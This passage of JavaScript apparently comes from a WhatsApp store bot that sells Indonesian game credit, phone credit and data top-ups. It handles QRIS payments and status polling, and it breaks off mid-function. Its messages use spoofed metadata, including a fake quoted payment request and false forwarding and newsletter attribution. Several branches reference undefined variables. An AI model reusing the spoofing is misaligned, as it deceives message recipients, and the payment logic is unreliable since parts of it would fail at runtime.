            case 'xl_pulsa':
            case 'axis_pulsa':
            case 'isat_pulsa':
            case 'tri_pulsa':

            case 'pln': {
            const name = getUserName(m.sender);

                const products = {
                    'ml': {
                        name: 'mobile-legends',
                        category: 'games',
                        filter_code: null
                    },
                    'mlbb': {
                        name: 'mobile-legends',
                        category: 'games',
                        filter_code: null
                    },
                    'ml_wdp': {
                        name: 'mobile-legends',
                        category: 'games',
                        filter_code: 'MLW'
                    },
                    'ml_sl': {
                        name: 'mobile-legends',
                        category: 'games',
                        filter_code: 'MLS'
                    },
                    'ml_tl': {
                        name: 'mobile-legends',
                        category: 'games',
                        filter_code: 'MLT'
                    },
                    'wdp': {
                        name: 'mobile-legends',
                        category: 'games',
                        filter_code: 'MLW'
                    },
                    'starlight': {
                        name: 'mobile-legends',
                        category: 'games',
                        filter_code: 'MLS'
                    },
                    'twilight': {
                        name: 'mobile-legends',
                        category: 'games',
                        filter_code: 'MLT'
                    },
                    'hok': {
                        name: 'honor-of-kings',
                        category: 'games',
                        filter_code: null
                    },
                    'aov': {
                        name: 'arena-of-valor',
                        category: 'games',
                        filter_code: null
                    },
                    'lol': {
                        name: 'league-of-legends',
                        category: 'games',
                        filter_code: null
                    },
                    'coc': {
                        name: 'clash-of-clans',
                        category: 'games',
                        filter_code: null
                    },
                    'ff': {
                        name: 'free-fire',
                        category: 'games',
                        filter_code: null
                    },
                    'pubg': {
                        name: 'pubg',
                        category: 'games',
                        filter_code: null
                    },

                    'byu_data': {
                        name: 'byu',
                        category: 'data-internet',
                        filter_code: null
                    },
                    'telkomsel_data': {
                        name: 'telkomsel',
                        category: 'data-internet',
                        filter_code: null
                    },
                    'tsel_data': {
                        name: 'telkomsel',
                        category: 'data-internet',
                        filter_code: null
                    },
                    'xl_data': {
                        name: 'xl',
                        category: 'data-internet',
                        filter_code: null
                    },
                    'axis_data': {
                        name: 'axis',
                        category: 'data-internet',
                        filter_code: null
                    },
                    'indosat_data': {
                        name: 'indosat',
                        category: 'data-internet',
                        filter_code: null
                    },
                    'isat_data': {
                        name: 'indosat',
                        category: 'data-internet',
                        filter_code: null
                    },
                    'tri_data': {
                        name: 'tri',
                        category: 'data-internet',
                        filter_code: null
                    },

                    'byu_pulsa': {
                        name: 'byu',
                        category: 'pulsa',
                        filter_code: null
                    },
                    'telkomsel_pulsa': {
                        name: 'telkomsel',
                        category: 'pulsa',
                        filter_code: null
                    },
                    'tsel_pulsa': {
                        name: 'telkomsel',
                        category: 'pulsa',
                        filter_code: null
                    },
                    'xl_pulsa': {
                        name: 'xl',
                        category: 'pulsa',
                        filter_code: null
                    },
                    'axis_pulsa': {
                        name: 'axis',
                        category: 'pulsa',
                        filter_code: null
                    },
                    'indosat_pulsa': {
                        name: 'indosat',
                        category: 'pulsa',
                        filter_code: null
                    },
                    'isat_pulsa': {
                        name: 'indosat',
                        category: 'pulsa',
                        filter_code: null
                    },
                    'tri_pulsa': {
                        name: 'tri',
                        category: 'pulsa',
                        filter_code: null
                    },

                    'pln': {
                        name: 'pln',
                        category: 'voucher',
                        filter_code: null
                    }

                };

                const productKey = products[command];
                if (!productKey) {
                    return sycreply('Perintah tidak valid.');
                }




                try {
    const response = await axios.post(
        `${config.api.base_url}/api/h2h/price-list/${productKey.category}/${productKey.name}`, {
            filter_code: productKey.filter_code || undefined,
            api_key: config.api.secret_key,
        }, {
            headers: {
                'Content-Type': 'application/json',
            },
        }
    );

    const result = response.data;

    if (!result.data) {
        return sycreply(result.message);
    }
let profile;
try {
    profile = await sych.profilePictureUrl(m.sender, 'image');
} catch (e) {
    profile = fake.anonim;
}

let listText = `*✅ : Tersedia*\n⛔ : Tidak Tersedia\n\n` +
               `${n}Produk List${n}⬇️\n\n` +
               `𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃`;

// Menambahkan daftar produk
result.data.forEach((item) => {
    const profit = (config.api.profit / 100) * item.price;
    const finalPrice = Number(item.price) + Number(Math.ceil(profit));
    listText += `\n╭⟬ *${item.status} ${item.name}*\n` +
                `┆• Harga: Rp ${toRupiah(finalPrice)}\n` +
                `┆• Kode: ${item.code}\n` +
                `╰──────────◇\n`;
});

// Tombol utama
let buttons = [
     
   
    { buttonId: ".pepek", buttonText: { displayText: " Owner📂 " }, type: 1 }
];
// Struktur pesan dengan media (gambar & dokumen)
let buttonMessage = {
    document: apkFile.document,
    fileName: apkFile.fileName,
    mimetype: apkFile.mimetype,
    fileLength: apkFile.fileLength,
    image: {
        url: profile,
        gifPlayback: true
    },
    caption: listText, // Isi pesan utama
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
            title: "RKA STORE",
            body: `ᬊᬁ Yth. Bpk/Ibu ${m.pushName ? m.pushName : 'Tanpa Nama'}\nSelamat Datang di RKA STORE!`,
            thumbnailUrl: profile,
            mediaType: 1,
            renderLargerThumbnail: true,
            previewType: 0,
            mediaUrl: "https://github.com/Galangxyz",
            sourceUrl: "https://github.com/Galangxyz"
        }
    },
    footer: "\n\nRKA STORE – Terintegrasi Dengan API, Belanja Mudah, Cepat, & Aman!",
    buttons: buttons,
    viewOnce: true,
    headerType: 4
};

// Bagian Sections (Menu tambahan)
let sections = [
    {
        title: 'Silahkan Pilih Menu di Bawah',
        highlight_label: 'Powered by Galangxyz',
        rows: [
            {
                title: 'Instruksi Order',
                description: 'Instruksi cara order.',
                id: `${prefix}orders`
            },
            {
                title: 'Kategori',
                description: 'Kembali ke kategori produk.',
                id: `${prefix}product`
            }
        ]
    }
];

let sectionss = [
    {
        title: 'Silahkan Pilih Menu di Bawah',
        highlight_label: 'Powered by Galangxyz',
        rows: [
            {
                title: 'Instruksi Order',
                description: 'Instruksi cara order.',
                id: `${prefix}orders`
            },
            {
                title: 'Kategori',
                description: 'Kembali ke kategori produk.',
                id: `${prefix}product`
            }
        ]
    }
];

// Menambahkan tombol berdasarkan item.code
result.data.forEach((item) => {
    sections[0].rows.push({
        title: `Cari ${item.code}`,
        description: `Pilih untuk mencari produk dengan kode ${item.code}.`,
        id: `search_by_code ${item.code}`
    });
});

// Struktur pesan dengan menu pilihan
let listMessage = {
    title: 'Next Menu',
    sections
};

let listtMessage = {
    title: 'Menu Lainnya',
    sections: sectionss // Perbaiki kesalahan `sectionss` tidak terhubung ke `sections`
};

// Flow Actions untuk daftar menu
const flowActions = [

    {
        buttonId: "bypas",
        buttonText: { displayText: "bypas 2" },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify(listMessage)
        },
        viewOnce: true
    },
    
    {
    buttonId: ".ping",
        buttonText: { displayText: " Ping Bot ⚠️" },
        type: 4,
        nativeFlowInfo: { buttonId: ".ping", buttonText: { displayText: " Owner📂 " }, type: 1 },
        viewOnce: true
    },
    {
    buttonId: "bypas",
        buttonText: { displayText: " bypas " },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify(listtMessage)
        },
        viewOnce: true
    } // **Perbaikan: Menutup objek ini dengan benar**
]; // **Perbaikan: Menutup array dengan `]`**

// Menambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan ke pengguna
await sych.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
} catch (error) {
    console.error('Error fetching data:', error);
    sycreply('Terjadi kesalahan, silahkan coba lagi nanti.');
}

                break;
            }
           
          case 'orders':
          case 'orderss': {
            
    const buttons = [
    {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                    display_text: "Format Order KODE,ID",
                    copy_code: `order HOK123XX,12345xxx`,
                }),
            },
    {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                    display_text: "Format Order Zona/ID",
                    copy_code: `order ML1xx,1234xxxx|24xxx`,
                }),
            },
        {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
                display_text: "Format Order KODE,TUJUAN",
                copy_code: `order S100,082320667363`
            }),
        }
    ];

let text = `Intruksi Order\n\nSemua parameter (code, target) diperlukan.\n\n*PETUNJUK PENGGUNAAN*

\`Produk game\`
- Format order: ${prefix}order KODE,ID
- Contoh: ${prefix}order HOK250,1223334782

\`Khusus produk game yang memakai Zone ID/Server\`
- Format order: ${prefix}order KODE,ID|SERVER
- Contoh: ${prefix}order MLW1,628299715|10135

\`Produk lainnya\`
- Format order: ${prefix}order KODE,TUJUAN
- Contoh: ${prefix}order S100,082320667363`
    // Kirim pesan interaktif
    const msg = generateWAMessageFromContent(
        m.chat, 
        {
            viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
            
                contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: true,
                    
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363373320014871@newsletter',
                        newsletterName: 'Powered By Galangxyz',
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: sych.decodeJid(sych.user.id)
                    },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: text
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "Powered By Galangxyz"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: "",
                    subtitle: "",
                    hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: "https://raw.githubusercontent.com/Galangxyz/Store/refs/heads/gh-pages/rka.jpg" } }, { upload: sych.waUploadToServer }))
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: buttons,
                        }),
                    }),
                },
            },
        },
        { quoted: fkontak }
    );

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });
}
break;


            // Orders
            case 'order':
            case 'topup': {
                if (global.lastMessageId) {
        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
    }
               
                const params = query.split(',').map(param => param.trim());
                const [code, ...targets] = params;
                const target = targets.join('|');

                if (!code || !target) {
                    return sycreply(`Semua parameter (code, target) diperlukan.\n\n*PETUNJUK PENGGUNAAN*

\`Produk game\`
- Format order: ${prefix}${command} KODE,ID
- Contoh: ${prefix}${command} HOK250,1223334782

\`Khusus produk game yang memakai Zone ID/Server\`
- Format order: ${prefix}${command} KODE,ID|SERVER
- Contoh: ${prefix}${command} MLW1,628299715|10135

\`Produk lainnya\`
- Format order: ${prefix}${command} KODE,TUJUAN
- Contoh: ${prefix}${command} S100,082320667363`);
                }

                const reffId = generateRandomText(10);
               const senderNumber = m.sender.split('@')[0];
                const tmpFilePath = path.join(__dirname, 'tmp', 'orders.json');

                let orderData = {};
                if (fs.existsSync(tmpFilePath)) {
                    orderData = JSON.parse(fs.readFileSync(tmpFilePath, 'utf8'));
                }

                if (orderData[senderNumber]) {
                    return sycreply(
                        `Kamu masih memiliki transaksi yang belum selesai. Tunggu hingga pembayaran selesai, kadaluarsa, atau gagal untuk membuat transaksi baru.\n\n_Ingin membatalkan topup? ketik *${prefix}cancel PAYID*_`
                    );
                }

                const date = new Date();
                const currentDate = new Date(date.toLocaleString('en-US', {
                    timeZone: config.time_zone
                }));

                axios.post(`${config.api.base_url}/api/h2h/price-list/all`, {
                        api_key: config.api.secret_key,
                    })
                    .then(response => {
                        const data = response.data;
                        if (!data.data) return sycreply(data.message);

                        const produk = data.data.find(item => item.code === code.toUpperCase());
                        if (!produk) return sycreply('Produk tidak ditemukan.');

                        const profit = (config.api.profit / 100) * produk.price;
                        const finalPrice = Number(produk.price) + Math.ceil(profit);
                        const produkDetail = `*Nama Produk:* ${produk.name}\n*Kode Produk:* ${produk.code}`;

                        performDeposit(reffId, produkDetail, finalPrice, code, target);
                    })
                    .catch(error => {
                        sycreply('Transaksi gagal dibuat. Silahkan laporkan masalah ini ke owner bot.');
                        console.error('Error:', error);
                    });

                function performDeposit(reffId, product, nominal, code, target) {
    axios.post(`${config.api.base_url}/api/h2h/deposit/create`, {
        reff_id: reffId,
        type: 'ewallet',
        method: 'QRISFAST',
        nominal: nominal,
        api_key: config.api.secret_key,
    })
    .then(async (response) => {
        const data = response.data;
        if (!data.data) return sycreply(data.message);

        orderData[senderNumber] = {
            reffId,
            payId: data.data.id,
            createdAt: data.data.created_at,
        };
        fs.writeFileSync(tmpFilePath, JSON.stringify(orderData, null, 2));
const fpay = {
  key: {
    remoteJid: '0@s.whatsapp.net',
    fromMe: false,
    id: global.namabot,
    participant: '0@s.whatsapp.net'
  },
  message: {
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR", // Ubah USD ke IDR (Rupiah)
      amount1000: Number(data.data.nominal), // Pastikan ini angka
      requestFrom: '0@s.whatsapp.net',
      noteMessage: {
        extendedTextMessage: {
          text: global.namabot
        }
      },
      expiryTimestamp: 999999999
    }
  }
};
        const text = `*TRANSAKSI BERHASIL DIBUAT*\n\n*Kode Pembayaran:* ${data.data.reff_id}\n*Nominal:* Rp ${toRupiah(data.data.nominal)}\n${product}\n*Dibuat Pada:* ${data.data.created_at}\n\n*Note:* Pembayaran akan otomatis dibatalkan 5 menit lagi!\n\n\`Bot ini telah terintegrasi dengan API yang disediakan oleh ${config.api.base_url}\``;
        
        

        const buttons = [
        {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
                display_text: "Batalkan Order", // Teks yang ditampilkan di tombol
                id: `cancel ${data.data.reff_id}` // ID unik untuk tombol ini
            })
        },
            {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                    display_text: "Salin Kode",
                    copy_code: `${data.data.reff_id}`,
                }),
            },
            {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                    display_text: "Salin Nominal",
                    copy_code: `${toRupiah(data.data.nominal)}`,
                }),
            },
        ];

        // Kirim gambar terlebih dahulu
await sych.sendMessage(m.chat, {
    image: { url: data.data.qr_image_url },
    
    caption: "Scan QR ini untuk melanjutkan pembayaran.",
}, { quoted: fpay });

// Kirim pesan interaktif
const msg = generateWAMessageFromContent(
    m.chat,
    {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: text,
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "Powered By Galangxyz",
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: "",
                        subtitle: "",
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: buttons,
                    }),
                }),
            },
        },
    },
    { quoted: fpay }
);
 // Simpan ID pesan terkirim untuk penghapusan otomatis
    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim

await sych.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
});

        checkPaymentStatus(data.data.id, reffId, code, target);
    })
    .catch((error) => console.error('Error:', error));
}

                function checkPaymentStatus(payId, reffId, code, target) {
                    const timeout = setTimeout(() => {
                        clearInterval(interval);

                        axios.post(`${config.api.base_url}/api/h2h/deposit/cancel`, {
                                id: payId,
                                api_key: config.api.secret_key,
                            })
                            .then(() => {
                                delete orderData[senderNumber];
                                fs.writeFileSync(tmpFilePath, JSON.stringify(orderData, null, 2));
                                sycreply('⚠️ *Pembayaran Dibatalkan Otomatis* setelah 5 menit tanpa konfirmasi keberhasilan.');
                            });
                    }, 300000);

                    const interval = setInterval(() => {
                        axios.post(`${config.api.base_url}/api/h2h/deposit/status`, {
                                id: payId,
                                api_key: config.api.secret_key,
                            })
                            .then(response => {
                                const data = response.data.data;

                                if (data.status === 'success' || data.status === 'failed') {
                                    clearInterval(interval);
                                    clearTimeout(timeout);

                                    delete orderData[senderNumber];
                                    fs.writeFileSync(tmpFilePath, JSON.stringify(orderData, null, 2));

                                    if (data.status === 'success') {
                                        performTopupTransaction(reffId, code, target);
                                        sycreply(`⬣ *Pembayaran Berhasil!*\n\n` +
                                            `◉ ID Pembayaran: ${data.reff_id}\n` +
                                            `◉ Status: ${data.status}\n` +
                                            `◉ Diterima: ${toRupiah(data.get_balance)}\n` +
                                            `◉ Tanggal: ${data.date}\n\n` +
                                            `Terimakasih.`);
                                    } else if (data.status === 'failed' || data.status === 'cancel' || data.status === 'canceled') {
                                        clearInterval(interval);
                                        return sycreply('Sangat disayangkan sekali. Pembayaran kamu dibatalkan oleh sistem.');
                                    }
                                }
                            });
                    }, 5000);
                }

                function performTopupTransaction(reffId, code, target) {
                    axios.post(`${config.api.base_url}/api/h2h/transaction/create`, {
                            reff_id: reffId,
                            product_code: code.toUpperCase(),
                            target: target,
                            api_key: config.api.secret_key,
                        })
                        .then(response => {
                            const data = response.data;

                            if (!data.data) return sycreply(data.message);

                            const text = 'Pembelian sedang di proses...';

                            sych.sendMessage(m.key.remoteJid, {
                                text
                            }, {
                                quoted: fkontak
                            });
                            

                            checkTransactionStatus(data.data.id);
                        })
                        .catch(error => console.error('Error:', error));
                }

                function checkTransactionStatus(id) {
                    const interval = setInterval(() => {
                        axios.post(`${config.api.base_url}/api/h2h/transaction/status`, {
                                id: id,
                                api_key: config.api.secret_key,
                            })
                            .then(response => {
                                const data = response.data.data;

                                if (data.status === 'success') {
                                    clearInterval(interval);

                                    const text = `⬣ *Pembelian Berhasil!*\n\n` +
                                        `◉ ID Transaksi: ${data.reff_id}\n` +
                                        `◉ Status: ${data.status}\n` +
                                        `◉ Layanan: ${data.name}\n` +
                                        `◉ Target: ${data.target}\n` +
                                        `◉ Serial Number: ${data.serial_number}\n` +
                                        `◉ Tanggal: ${data.date}\n\n` +
                                        `Terimakasih.`;

                                    sych.sendMessage(m.key.remoteJid, {
                                        text
                                    }, {
                                        quoted: fkontak
                                    });
                                     // Simpan ID pesan terkirim untuk penghapusan otomatis
    global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim

                                } else if (data.status === 'cancel' || data.status === 'canceled') {
                                    clearInterval(interval);
                                } else if (data.status === 'failed') {
                                    clearInterval(interval);
                                    sycreply('Transaksi gagal. Silakan laporkan masalah ini ke owner bot.');
                                }
                            });
                    }, 5000);
                }
                break;
            }

            case 'order2':
            case 'topup2': {
                const params = query.split(',').map(param => param.trim());
                const [code, ...targets] = params;
                const target = targets.join('|');

                if (!code || !target) {
                    return sycreply(`Semua parameter (code, target) diperlukan.\n\n*PETUNJUK PENGGUNAAN*

\`Produk game\`
- Format order: ${prefix}${command} KODE,ID
- Contoh: ${prefix}${command} HOK250,1223334782

\`Khusus produk game yang memakai Zone ID/Server\`
- Format order: ${prefix}${command} KODE,ID|SERVER
- Contoh: ${prefix}${command} MLW1,628299715|10135

\`Produk lainnya\`
- Format order: ${prefix}${command} KODE,TUJUAN
- Contoh: ${prefix}${command} S100,082320667363`);
                }

                const reffId = generateRandomText(10);

                axios.post(`${config.api.base_url}/api/h2h/price-list/all`, {
                        api_key: config.api.secret_key,
                    })
                    .then(response => {
                        const data = response.data;

                        if (!data.data) return sycreply(data.message);

                        const produk = data.data.find(item => item.code === code.toUpperCase());
                        if (!produk) return sycreply('Produk tidak ditemukan.');

                        const profit = (config.api.profit / 100) * produk.price;
                        const finalPrice = Number(produk.price) + Math.ceil(profit);
                        const produkDetail = `*Nama Produk:* ${produk.name}\n*Kode Produk:* ${produk.code}`;

                        lakukanDeposit(reffId, produkDetail, finalPrice, code, target);
                    })
                    .catch(error => {
                        sycreply('Transaksi gagal dibuat. Silahkan laporkan masalah ini ke owner bot.');
                        console.error('Error:', error);
                    });

                function lakukanDeposit(reffId, product, nominal, code, target) {
                    axios.post(`${config.api.base_url}/api/h2h/deposit/create`, {
                            reff_id: reffId,
                            type: 'ewallet',
                            method: 'QRISFAST',
                            nominal: nominal,
                            api_key: config.api.secret_key,
                        })
                        .then(response => {
                            const data = response.data;

                            if (!data.data) return sycreply(data.message);

                            const text = `*TRANSAKSI BERHASIL DIBUAT*\n\n*Kode Pembayaran:* ${data.data.reff_id}\n*Nominal:* Rp ${toRupiah(data.data.nominal)}\n${product}\n*Dibuat Pada:* ${data.data.created_at}\n\n*Note:* Pembayaran akan otomatis dibatalkan 5 menit lagi!\n\n\`Bot ini telah terintegrasi dengan API yang disediakan oleh ${config.api.base_url}\``;

                            sych.sendMessage(m.key.remoteJid, {
                                    image: {
                                        url: data.data.qr_image_url
                                    },
                                    caption: text,
                                }, {
                                    quoted: fkontak
                                })
                                .then(sentMessage => {
                                    const messageId = sentMessage.key.id;

                                    checkPaymentStatus(data.data.id, messageId, reffId, code, target);

                                    setTimeout(() => {
                                        sych.sendMessage(m.key.remoteJid, {
                                            delete: {
                                                remoteJid: jid,
                                                fromMe: true,
                                                id: messageId
                                            },
                                        });
                                    }, 300000);
                                });
                        })
                        .catch(error => console.error('Error:', error));
                }

                function checkPaymentStatus(payId, messageId, reffId, code, target) {
                    const interval = setInterval(() => {
                        axios.post(`${config.api.base_url}/api/h2h/deposit/status`, {
                                id: payId,
                                api_key: config.api.secret_key,
                            })
                            .then(response => {
                                const data = response.data.data;

                                if (data.status === 'success') {
                                    clearInterval(interval);
                                    clearTimeout(timeout);

                                    lakukanTransaksiTopup(reffId, code, target);

                                    sycreply(`⬣ *Pembayaran Berhasil!*\n\n` +
                                        `◉ ID Pembayaran: ${data.reff_id}\n` +
                                        `◉ Status: ${data.status}\n` +
                                        `◉ Diterima: ${toRupiah(data.get_balance)}\n` +
                                        `◉ Tanggal: ${data.date}\n\n` +
                                        `Terimakasih.`);

                                    sych.sendMessage(m.key.remoteJid, {
                                        delete: {
                                            remoteJid: jid,
                                            fromMe: true,
                                            id: messageId
                                        },
                                    });
                                } else if (data.status === 'cancel' || data.status === 'canceled') {
                                    clearInterval(interval);
                                } else if (data.status === 'failed') {
                                    clearInterval(interval);
                                    sycreply('Transaksi gagal. Silakan laporkan masalah ini ke owner bot.');
                                }
                            });
                    }, 5000);

                    const timeout = setTimeout(() => {
                        clearInterval(interval);

                        axios.post(`${config.api.base_url}/api/h2h/deposit/cancel`, {
                                id: payId,
                                api_key: config.api.secret_key,
                            })
                            .then(response => {
                                const data = response.data;

                                if (!data.data) return sycreply(data.message);

                                sycreply(`⚠️ *Pembayaran Dibatalkan Otomatis* setelah 5 menit tanpa konfirmasi keberhasilan.`);
                            });
                    }, 300000);
                }

                function lakukanTransaksiTopup(reffId, code, target) {
                    axios.post(`${config.api.base_url}/api/h2h/transaction/create`, {
                            reff_id: reffId,
                            product_code: code.toUpperCase(),
                            target: target,
                            api_key: config.api.secret_key,
                        })
                        .then(response => {
                            const data = response.data;

                            if (!data.data) return sycreply(data.message);

                            const text = 'Pembelian sedang di proses...';

                            sych.sendMessage(m.key.remoteJid, {
                                text
                            }, {
                                quoted: fkontak
                            });

                            checkTransaksiStatus(data.data.id);
                        })
                        .catch(error => console.error('Error:', error));
                }

                function checkTransaksiStatus(id) {
                    const interval = setInterval(() => {
                        axios.post(`${config.api.base_url}/api/h2h/transaction/status`, {
                                id: id,
                                api_key: config.api.secret_key,
                            })
                            .then(response => {
                                const data = response.data.data;

                                if (data.status === 'success') {
                                    clearInterval(interval);

                                    const text = `⬣ *Pembelian Berhasil!*\n\n` +
                                        `◉ ID Transaksi: ${data.reff_id}\n` +
                                        `◉ Status: ${data.status}\n` +
                                        `◉ Layanan: ${data.name}\n` +
                                        `◉ Target: ${data.target}\n` +
                                        `◉ Serial Number: ${data.serial_number}\n` +
                                        `◉ Tanggal: ${data.date}\n\n` +
                                        `Terimakasih.`;

                                    sych.sendMessage(m.key.remoteJid, {
                                        text
                                    }, {
                                        quoted: fkontak
                                    });
                                } else if (data.status === 'cancel' || data.status === 'canceled') {
                                    clearInterval(interval);
                                } else if (data.status === 'failed') {
                                    clearInterval(interval);
                                    sycreply('Transaksi gagal. Silakan laporkan masalah ini ke owner bot.');
                                }
                            });
                    }, 5000);
                }
                break;
            }

            case 'cancel': {
                if (global.lastMessageId) {
        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
    }
    const params = query.split(',').map(param => param.trim());
    const [reffId] = params;

    if (!reffId) {
        return sycreply('Parameter `reffId` diperlukan untuk membatalkan deposit.\n\n*PETUNJUK PENGGUNAAN*\n\n' +
            `\`Format: ${prefix}${command} REFFID\`\n` +
            `\`Contoh: ${prefix}${command} ABC123456\``);
    }
               const senderNumber = m.sender.split('@')[0];
    const tmpFilePath = path.join(__dirname, 'tmp', 'orders.json');

    let orderData = {};
    if (fs.existsSync(tmpFilePath) && fs.statSync(tmpFilePath).size > 0) {
        orderData = JSON.parse(fs.readFileSync(tmpFilePath, 'utf8'));
    } else {
        return sycreply('Data transaksi tidak ditemukan.');
    }

    console.log('Order Data:', JSON.stringify(orderData, null, 2)); // Debugging

    if (!orderData[senderNumber]) {
        return sycreply('Tidak ada transaksi yang terkait dengan nomor pengirim ini.');
    }

    if (orderData[senderNumber].reffId !== reffId) {
        return sycreply('Tidak ada transaksi yang terkait dengan kode pembayaran ini.');
    }

    const payId = orderData[senderNumber].payId;

    axios.post(`${config.api.base_url}/api/h2h/deposit/cancel`, {
            id: payId,
            api_key: config.api.secret_key,
        })
        
        .then(() => {
            delete orderData[senderNumber];

            fs.writeFileSync(tmpFilePath, JSON.stringify(orderData, null, 2));

            sycreply(`⚠️ Pembayaran dengan reffId ${reffId} dan payId ${payId} telah dibatalkan.`);
        })
        .catch(error => {
            console.error('Error:', error);
            sycreply('Gagal membatalkan deposit. Silakan coba lagi atau laporkan masalah ini ke owner bot.');
        });

    break;
}

            case 'buy': {
                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');

                const params = query.split(',').map(param => param.trim());
                const [code, ...targets] = params;
                const target = targets.join(',');

                if (!code || !target) {
                    return sycreply(`Semua parameter (code, target) diperlukan.\n\nContoh: ${prefix}${command} ML3,628299715|10135`);
                };

                const reffId = generateRandomText(10);

                try {
                    const response = await axios.post(`${config.api.base_url}/api/h2h/transaction/create`, {
                        reff_id: reffId,
                        product_code: code.toUpperCase(),
                        target: target,
                        api_key: config.api.secret_key
                    });

                    const data = response.data;

                    if (!data.data) return sycreply(data.message);

                    const text = `Pembelian sedang di prosess:\n\nLayanan: ${data.data.name}\nTarget: ${data.data.target}\nReff id: ${data.data.reff_id}\nNominal: Rp ${toRupiah(data.data.price)}\nSN: ${data.data.serial_number}\nDibuat pada: ${data.data.date}`;
                    sych.sendMessage(m.key.remoteJid, {
                        text: text
                    }, {
                        quoted: fkontak
                    }).then(sentMessage => {
                        checkTransactionStatus(data.data.id, sentMessage.key.id);

                        setTimeout(() => {
                            sych.sendMessage(m.key.remoteJid, {
                                delete: {
                                    remoteJid: jid,
                                    fromMe: true,
                                    id: sentMessage.key.id
                                }
                            });
                        }, 300000);
                    });
                } catch (error) {
                    console.error('Error fetching data:', error);
                    sycreply('Saldo tidak cukup!');
                }

                async function checkTransactionStatus(id, messageId) {
                    const interval = setInterval(async () => {
                        const response = await axios.post(`${config.api.base_url}/api/h2h/transaction/status`, {
                            id: id,
                            api_key: config.api.secret_key
                        });

                        const data = response.data;

                        if (data.data.status === 'success') {
                            clearInterval(interval);
                            clearTimeout(timeout);
                            sycreply(`⬣ *Pembelian Berhasil!*\n\n` +
                                `◉ ID Pembayaran: ${data.data.reff_id}\n` +
                                `◉ Status: ${data.data.status}\n` +
                                `◉ Layanan: ${data.data.name}\n` +
                                `◉ Target: ${data.data.target}\n` +
                                `◉ Serial Number: ${data.data.serial_number}\n` +
                                `◉ Tanggal: ${data.data.date}\n\n` +
                                `Terimakasih.`);
                            sych.sendMessage(m.key.remoteJid, {
                                delete: {
                                    remoteJid: jid,
                                    fromMe: true,
                                    id: messageId
                                }
                            });
                        } else if (data.data.status === 'failed') {
                            clearInterval(interval);
                            sycreply(`Sangat Disayangkan Sekali. Pembayaran Kamu Dibatalkan Oleh Sistem.`);
                        }
                    }, 5000);

                }

                break;
            }

            // Deposit
            case 'deposit':
            case 'depo': {
                if (!isCreator) return sycreply('❌ Kamu tidak memiliki izin untuk menggunakan fitur ini.');

                if (!query) return sycreply(`Example: ${prefix}${command} 500.`);
                const nominal = query;
                if (nominal < 500) return sycreply('Jumlah minimal: 500.');

                const reffId = generateRandomText(10);

                try {
                    const response = await axios.post(`${config.api.base_url}/api/h2h/deposit/create`, {
                        reff_id: reffId,
                        type: 'ewallet',
                        method: 'QRISFAST',
                        nominal: nominal,
                        api_key: config.api.secret_key
                    });

                    const data = response.data;

                    if (!data.data) return sycreply(data.message);

                    const text = `Reff id: ${data.data.reff_id}\nNominal: Rp ${toRupiah(data.data.nominal)}\nFee: Rp ${toRupiah(data.data.fee)}\nDiterima: Rp ${toRupiah(data.data.get_balance)}\nDibuat pada: ${data.data.created_at}\n\nNote: Pembayaran akan otomatis dibatalkan 5 menit lagi!`;
                    sych.sendMessage(m.key.remoteJid, {
                        image: {
                            url: data.data.qr_image_url
                        },
                        caption: text
                    }, {
                        quoted: fkontak
                    }).then(sentMessage => {
                        checkPaymentStatus(data.data.id, sentMessage.key.id);

                        setTimeout(() => {
                            sych.sendMessage(m.key.remoteJid, {
                                delete: {
                                    remoteJid: jid,
                                    fromMe: true,
                                    id: sentMessage.key.id
                                }
                            });
                        }, 300000);
                    });

                    async function checkPaymentStatus(id, messageId) {
                        const interval = setInterval(async () => {
                            const response = await axios.post(`${config.api.base_url}/api/h2h/deposit/status`, {
                                id: id,
                                api_key: config.api.secret_key
                            });

                            const data = response.data;

                            if (data.data.status === 'success') {
                                clearInterval(interval);
                                clearTimeout(timeout);
                                sycreply(`⬣ *Pembayaran Berhasil!*\n\n` +
                                    `◉ ID Pembayaran: ${data.data.reff_id}\n` +
